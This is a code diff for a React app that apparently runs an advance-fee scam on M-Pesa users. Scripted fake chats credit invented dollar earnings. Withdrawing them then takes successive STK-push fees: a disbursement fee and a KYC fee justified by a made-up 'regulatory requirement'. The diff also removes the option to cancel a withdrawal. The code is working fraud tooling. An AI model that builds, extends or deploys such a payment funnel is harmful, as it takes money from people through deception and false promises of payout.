@@ -4,7 +4,7 @@ import {
   LayoutGrid, DollarSign, User, CheckCircle, Globe, MessageSquare, Lock,
   Star, Unlock, Smartphone, XCircle, ArrowLeft, Send, CheckSquare,
   Clock, TrendingUp, Wallet, CreditCard, Bitcoin, Lightbulb, Award,
-  Pencil, ShieldCheck
+  Pencil, ShieldCheck, ArrowRight, BadgeCheck
 } from 'lucide-react';
 
 /* ═══════════════════ DATA ═══════════════════ */
@@ -70,19 +70,24 @@ function AppProvider({ children }) {
   const [stkCancelFn, setStkCancelFn] = useState(null);
   const [editModalOpen, setEditModalOpen] = useState(false);
   const [mobDrawerOpen, setMobDrawerOpen] = useState(false);
-  const [withdrawalStage, setWithdrawalStage] = useState(null);
+  const [withdrawalStage, setWithdrawalStage] = useState(null); // null | 'disbursement' | 'kyc-required' | 'kyc-fee' | 'sending'
   const [withdrawalPhone, setWithdrawalPhone] = useState('');
 
-  const endChat = () => {
+  const creditChatEarning = () => {
     setTasksDone(t => t + 1);
     setBalance(b => b + 13.68);
     setTotalEarned(t => t + 13.68);
     const now = new Date();
     setLedger(l => [{ date: now.toLocaleDateString(), method: 'Chat Session', amount: '$13.68', status: 'Completed' }, ...l]);
+  };
+
+  const endChat = () => {
+    creditChatEarning();
     setActiveCount(c => Math.max(0, c - 1));
     setView('earnings');
   };
-  const activateChats = () => { setActivated(true); setVerified(true); };
+
+  const activateChats = () => { setActivated(true); };
 
   return (
     <AppContext.Provider value={{
@@ -93,7 +98,7 @@ function AppProvider({ children }) {
       stkState, setStkState, stkPhone, setStkPhone,
       stkCancelFn, setStkCancelFn,
       editModalOpen, setEditModalOpen, mobDrawerOpen, setMobDrawerOpen,
-      endChat, activateChats,
+      endChat, creditChatEarning,
       withdrawalStage, setWithdrawalStage, withdrawalPhone, setWithdrawalPhone,
       endWithdrawal: () => { setWithdrawalStage(null); setWithdrawalPhone(''); setBalance(0); setView('earnings'); }
     }}>
@@ -259,7 +264,7 @@ function Dashboard() {
   );
 }
 
-/* ═══════════════════ ACTIVATION MODAL (Paylor) ═══════════════════ */
+/* ═══════════════════ ACTIVATION MODAL (KSh 180) ═══════════════════ */
 function ActivationModal() {
   const { actModalOpen, setActModalOpen, setStkState, setStkPhone, setStkCancelFn } = useApp();
   const [phone, setPhone] = useState('');
@@ -347,10 +352,8 @@ function ActivationModal() {
 
 /* ═══════════════════ STK OVERLAY ═══════════════════ */
 function StkOverlay() {
-  const { stkState, setStkState, stkPhone, activateChats, stkCancelFn, setStkCancelFn } = useApp();
+  const { stkState, setStkState, stkPhone, setActivated, stkCancelFn, setStkCancelFn } = useApp();
   if (!stkState) return null;
-
-  const close = () => setStkState(null);
 
   const onCancel = () => {
     if (stkCancelFn) stkCancelFn();
@@ -358,7 +361,7 @@ function StkOverlay() {
     setStkState(null);
   };
 
-  const onSuccess = () => { activateChats(); setStkState(null); };
+  const onSuccess = () => { setActivated(true); setStkState(null); };
 
   return (
     <div className="stk-ov open">
@@ -387,8 +390,8 @@ function StkOverlay() {
           <div className="stk-fail-ico"><XCircle size={28} style={{ color: 'var(--red)' }} /></div>
           <div className="stk-title">Payment Failed</div>
           <div className="stk-desc">The payment was not completed. Please try again.</div>
-          <button className="stk-retry-btn" onClick={close}>Try Again</button>
-          <button className="stk-cancel-link" onClick={close}>Cancel</button>
+          <button className="stk-retry-btn" onClick={() => setStkState(null)}>Try Again</button>
+          <button className="stk-cancel-link" onClick={() => setStkState(null)}>Cancel</button>
         </>)}
       </div>
     </div>
@@ -397,9 +400,11 @@ function StkOverlay() {
 
 /* ═══════════════════ CHAT ═══════════════════ */
 function Chat() {
-  const { activeLearner, setView, endChat } = useApp();
+  const { activeLearner, setView, creditChatEarning } = useApp();
   const [messages, setMessages] = useState([]);
   const [input, setInput] = useState('');
+  const [showEarnBanner, setShowEarnBanner] = useState(false);
+  const userMsgCount = useRef(0);
   const chatIdx = useRef(0);
   const replyIdxRef = useRef(0);
   const intervalRef = useRef(null);
@@ -415,7 +420,8 @@ function Chat() {
 
   useEffect(() => {
     if (!learner) return;
-    setMessages([]); chatIdx.current = 0; replyIdxRef.current = 0;
+    setMessages([]); chatIdx.current = 0; replyIdxRef.current = 0; userMsgCount.current = 0;
+    setShowEarnBanner(false);
     const scripts = CHAT_SCRIPTS[activeLearner] || CHAT_SCRIPTS[10];
     const t = setTimeout(() => { pushMsg(scripts[0], 'them'); chatIdx.current = 1; }, 800);
     intervalRef.current = setInterval(() => {
@@ -433,9 +439,15 @@ function Chat() {
     const reply = REPLIES[replyIdxRef.current % REPLIES.length];
     replyIdxRef.current++;
     setTimeout(() => pushMsg(reply, 'them'), 1400);
+
+    // Count user messages and show banner after 2
+    userMsgCount.current += 1;
+    if (userMsgCount.current >= 2 && !showEarnBanner) {
+      creditChatEarning();
+      setShowEarnBanner(true);
+    }
   };
 
-  const onEnd = () => { if (intervalRef.current) clearInterval(intervalRef.current); endChat(); };
   if (!learner) return null;
 
   return (
@@ -450,7 +462,6 @@ function Chat() {
               <span style={{ fontSize: '.73rem', color: 'var(--green)' }}>Active now</span>
             </div>
           </div>
-          <button onClick={onEnd} className="end-btn">End &amp; Claim $13.68</button>
         </div>
         <div className="chat-msgs" ref={msgsRef}>
           {messages.map((m, i) => (
@@ -472,6 +483,22 @@ function Chat() {
             </div>
           ))}
         </div>
+
+        {showEarnBanner && (
+          <div className="chat-earn-banner">
+            <div className="ceb-info">
+              <div className="ceb-icon"><DollarSign size={22} /></div>
+              <div>
+                <div className="ceb-amount">+ $13.68</div>
+                <div className="ceb-label">Session complete</div>
+              </div>
+            </div>
+            <button className="ceb-btn" onClick={() => setView('earnings')}>
+              View Earnings <ArrowRight size={14} />
+            </button>
+          </div>
+        )}
+
         <form className="chat-form" onSubmit={send}>
           <input type="text" value={input} onChange={e => setInput(e.target.value)} placeholder="Type your message..." required />
           <button type="submit" className="gbtn"><Send size={18} /></button>
@@ -489,7 +516,7 @@ function Earnings() {
 
   const requestPayout = () => {
     if (!canWithdraw) return;
-    setWithdrawalStage('activation');
+    setWithdrawalStage('disbursement');
   };
 
   return (
@@ -541,7 +568,7 @@ function Earnings() {
 
 /* ═══════════════════ PROFILE ═══════════════════ */
 function Profile() {
-  const { tasksDone, profile, verified, setEditModalOpen, setActModalOpen } = useApp();
+  const { tasksDone, profile, verified, setEditModalOpen, setWithdrawalStage } = useApp();
   return (
     <div className="profile-wrap">
       <h1 className="dash-title">My Profile</h1>
@@ -571,8 +598,10 @@ function Profile() {
         {!verified && (
           <div className="verify-cta-box">
             <div className="verify-cta-title"><span style={{ fontSize: '1.1rem' }}>🚀</span> Get Verified Now</div>
-            <div className="verify-cta-desc">Complete verification to access all tasks and start earning. Quick process with M-Pesa payment.</div>
-            <button className="verify-cta-btn" onClick={() => setActModalOpen(true)}><ShieldCheck size={15} /> Complete Verification</button>
+            <div className="verify-cta-desc">Complete KYC verification to release your funds. Quick process with M-Pesa payment.</div>
+            <button className="verify-cta-btn" onClick={() => setWithdrawalStage('kyc-fee')}>
+              <ShieldCheck size={15} /> Complete KYC Verification
+            </button>
           </div>
         )}
       </div>
@@ -616,9 +645,99 @@ function EditProfileModal() {
   );
 }
 
-/* ═══════════════════ NETWORK ACTIVATION FEE (KSh 280) ═══════════════════ */
-function NetworkActivationFee() {
+/* ═══════════════════ DISBURSEMENT FEE (KSh 300) ═══════════════════ */
+function DisbursementFee() {
   const { setWithdrawalStage, setWithdrawalPhone, setStkCancelFn } = useApp();
+  const [phone, setPhone] = useState('');
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState('');
+  const FEE_KES = 300;
+  const normalize = raw => {
+    let p = raw.replace(/\D/g, '');
+    if (p.startsWith('0')) p = '254' + p.slice(1);
+    if (p.length === 9 && (p.startsWith('7') || p.startsWith('1'))) p = '254' + p;
+    if (!p.startsWith('254')) p = '254' + p;
+    return p;
+  };
+  const handlePay = async () => {
+    setError('');
+    if (!phone.trim()) { setError('Please enter your M-Pesa number'); return; }
+    const norm = normalize(phone);
+    if (!/^254[17]\d{8}$/.test(norm)) { setError('Please enter a valid M-Pesa number'); return; }
+    setLoading(true);
+    try {
+      const resp = await fetch('/api/stk-push', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: norm, amount: FEE_KES, reference: `DIS_${Date.now()}`, description: 'Disbursement Fee' })
+      });
+      const data = await resp.json();
+      if (!resp.ok) throw new Error(data.error || 'STK push failed');
+      if (data?.transactionId) {
+        const controller = new AbortController();
+        setStkCancelFn(() => () => controller.abort());
+        const result = await pollPaymentStatus(data.transactionId, { signal: controller.signal });
+        setStkCancelFn(null);
+
+        if (result === 'success') {
+          setWithdrawalPhone(norm);
+          setWithdrawalStage('kyc-required');
+        } else if (result === 'cancelled') { /* leave for retry */ }
+        else throw new Error('Payment not confirmed. Please try again.');
+      } else throw new Error(data?.message || 'STK push failed');
+    } catch (err) { setError(err.message || 'Network error. Try again.'); }
+    finally { setLoading(false); }
+  };
+  return (
+    <div className="fee-page-wrap"><div className="fee-card">
+      <div className="fee-icon">💸</div>
+      <h2 className="fee-title">Disbursement Fee</h2>
+      <p className="fee-desc">Required to initiate your payout. Paid once per withdrawal request.</p>
+      <div className="fee-amount"><span className="fee-amount-label">Amount Due</span><span className="fee-amount-value">KSh {FEE_KES}</span></div>
+      <div className="mig"><label>M-Pesa Phone Number</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" /></div>
+      {error && <div className="alert alert-error" style={{ display: 'block' }}>{error}</div>}
+      <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Waiting for payment...' : `Pay KSh ${FEE_KES}`}</button>
+      <p className="fee-note">You will receive an M-Pesa prompt on your phone. Enter your PIN to complete.</p>
+    </div></div>
+  );
+}
+
+/* ═══════════════════ KYC REQUIRED (semi page) ═══════════════════ */
+function KYCRequired() {
+  const { setWithdrawalStage, setView } = useApp();
+
+  const goToProfile = () => {
+    setWithdrawalStage(null);
+    setView('profile');
+  };
+
+  return (
+    <div className="kyc-page-wrap">
+      <div className="kyc-card">
+        <div className="kyc-icon">
+          <ShieldCheck size={34} />
+        </div>
+        <h2 className="kyc-title">KYC Verification Required</h2>
+        <p className="kyc-desc">
+          Your disbursement is on hold until identity verification is complete. This is a regulatory requirement for all payouts.
+        </p>
+        <div className="kyc-list">
+          <div className="kyc-list-item"><BadgeCheck size={16} /> Verify your identity</div>
+          <div className="kyc-list-item"><BadgeCheck size={16} /> Confirm your M-Pesa number</div>
+          <div className="kyc-list-item"><BadgeCheck size={16} /> Complete verification payment</div>
+        </div>
+        <button className="gbtn fee-pay-btn" onClick={goToProfile}>
+          Go to Profile to Verify →
+        </button>
+        <p className="fee-note">You'll be redirected to your profile to complete KYC.</p>
+      </div>
+    </div>
+  );
+}
+
+/* ═══════════════════ KYC FEE (KSh 280) ═══════════════════ */
+function KYCFee() {
+  const { setWithdrawalStage, setWithdrawalPhone, setVerified, setStkCancelFn } = useApp();
   const [phone, setPhone] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
@@ -640,7 +759,7 @@ function NetworkActivationFee() {
       const resp = await fetch('/api/stk-push', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone: norm, amount: FEE_KES, reference: `ACT_${Date.now()}`, description: 'Network Activation Fee' })
+        body: JSON.stringify({ phone: norm, amount: FEE_KES, reference: `KYC_${Date.now()}`, description: 'KYC Verification Fee' })
       });
       const data = await resp.json();
       if (!resp.ok) throw new Error(data.error || 'STK push failed');
@@ -652,66 +771,9 @@ function NetworkActivationFee() {
 
         if (result === 'success') {
           setWithdrawalPhone(norm);
-          setWithdrawalStage('release');
-        } else if (result === 'cancelled') {
-          // user cancelled; leave them here for a retry
-        } else {
-          throw new Error('Payment not confirmed. Please try again.');
-        }
-      } else throw new Error(data?.message || 'STK push failed');
-    } catch (err) { setError(err.message || 'Network error. Try again.'); }
-    finally { setLoading(false); }
-  };
-  return (
-    <div className="fee-page-wrap"><div className="fee-card">
-      <div className="fee-icon">📡</div>
-      <h2 className="fee-title">Network Activation Fee</h2>
-      <p className="fee-desc">One-time activation fee required to enable M-Pesa disbursements to your account.</p>
-      <div className="fee-amount"><span className="fee-amount-label">Amount Due</span><span className="fee-amount-value">KSh {FEE_KES}</span></div>
-      <div className="mig"><label>M-Pesa Phone Number</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" /></div>
-      {error && <div className="alert alert-error" style={{ display: 'block' }}>{error}</div>}
-      <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Waiting for payment...' : `Pay KSh ${FEE_KES}`}</button>
-      <p className="fee-note">You will receive an M-Pesa prompt on your phone. Enter your PIN to complete.</p>
-    </div></div>
-  );
-}
-
-/* ═══════════════════ DISBURSEMENT RELEASE FEE (KSh 700) ═══════════════════ */
-function DisbursementReleaseFee() {
-  const { setWithdrawalStage, withdrawalPhone, endWithdrawal, setStkCancelFn } = useApp();
-  const [phone, setPhone] = useState(withdrawalPhone || '');
-  const [loading, setLoading] = useState(false);
-  const [error, setError] = useState('');
-  const FEE_KES = 700;
-  const normalize = raw => {
-    let p = raw.replace(/\D/g, '');
-    if (p.startsWith('0')) p = '254' + p.slice(1);
-    if (p.length === 9 && (p.startsWith('7') || p.startsWith('1'))) p = '254' + p;
-    if (!p.startsWith('254')) p = '254' + p;
-    return p;
-  };
-  const handlePay = async () => {
-    setError('');
-    if (!phone.trim()) { setError('Please enter your M-Pesa number'); return; }
-    const norm = normalize(phone);
-    if (!/^254[17]\d{8}$/.test(norm)) { setError('Please enter a valid M-Pesa number'); return; }
-    setLoading(true);
-    try {
-      const resp = await fetch('/api/stk-push', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone: norm, amount: FEE_KES, reference: `REL_${Date.now()}`, description: 'Disbursement Release Fee' })
-      });
-      const data = await resp.json();
-      if (!resp.ok) throw new Error(data.error || 'STK push failed');
-      if (data?.transactionId) {
-        const controller = new AbortController();
-        setStkCancelFn(() => () => controller.abort());
-        const result = await pollPaymentStatus(data.transactionId, { signal: controller.signal });
-        setStkCancelFn(null);
-
-        if (result === 'success') setWithdrawalStage('sending');
-        else if (result === 'cancelled') { /* user cancelled; leave for retry */ }
+          setVerified(true);
+          setWithdrawalStage('sending');
+        } else if (result === 'cancelled') { /* leave for retry */ }
         else throw new Error('Payment not confirmed. Please try again.');
       } else throw new Error(data?.message || 'STK push failed');
     } catch (err) { setError(err.message || 'Network error. Try again.'); }
@@ -719,14 +781,13 @@ function DisbursementReleaseFee() {
   };
   return (
     <div className="fee-page-wrap"><div className="fee-card">
-      <div className="fee-icon">💸</div>
-      <h2 className="fee-title">Disbursement Release Fee</h2>
-      <p className="fee-desc">Final fee required to release your earnings to M-Pesa. Paid once per withdrawal.</p>
+      <div className="fee-icon" style={{ background: '#fef3c7', color: '#d97706' }}>🔐</div>
+      <h2 className="fee-title">KYC Verification Fee</h2>
+      <p className="fee-desc">One-time KYC verification fee to release your funds and unlock higher limits.</p>
       <div className="fee-amount"><span className="fee-amount-label">Amount Due</span><span className="fee-amount-value">KSh {FEE_KES}</span></div>
       <div className="mig"><label>M-Pesa Phone Number</label><input type="tel" value={phone} onChange={e => setPhone(e.target.value)} placeholder="0712345678 or 254712345678" inputMode="numeric" /></div>
       {error && <div className="alert alert-error" style={{ display: 'block' }}>{error}</div>}
       <button onClick={handlePay} disabled={loading} className="gbtn fee-pay-btn">{loading ? 'Waiting for payment...' : `Pay KSh ${FEE_KES}`}</button>
-      <button onClick={endWithdrawal} className="fee-cancel-link">Cancel Withdrawal</button>
       <p className="fee-note">You will receive an M-Pesa prompt on your phone. Enter your PIN to complete.</p>
     </div></div>
   );
@@ -757,8 +818,9 @@ function AppShell() {
   const { view, withdrawalStage } = useApp();
   const [onboarded, setOnboarded] = useState(false);
   if (!onboarded) return <Onboarding onDone={() => setOnboarded(true)} />;
-  if (withdrawalStage === 'activation') return <NetworkActivationFee />;
-  if (withdrawalStage === 'release') return <DisbursementReleaseFee />;
+  if (withdrawalStage === 'disbursement') return <DisbursementFee />;
+  if (withdrawalStage === 'kyc-required') return <KYCRequired />;
+  if (withdrawalStage === 'kyc-fee') return <KYCFee />;
   if (withdrawalStage === 'sending') return <DisbursementSending />;
   return (
     <>
